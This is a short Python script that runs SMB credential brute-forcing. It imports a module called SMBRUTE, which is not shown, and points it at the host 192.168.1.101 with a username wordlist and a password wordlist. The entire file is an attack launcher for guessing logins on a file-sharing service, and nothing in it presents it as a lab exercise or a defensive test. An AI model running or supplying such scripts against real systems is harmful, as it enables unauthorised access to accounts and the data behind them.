#!/usr/bin/env python3

import SMBRUTE

id_j = "168"
ip_target = '192.168.1.101'
fileusers = 'userlarge.txt'
filepass = 'passsmall.txt'



bruteforce = SMBRUTE.smbbruteforce()
bruteforce.bruteforce(id_j,ip_target, fileusers, filepass)

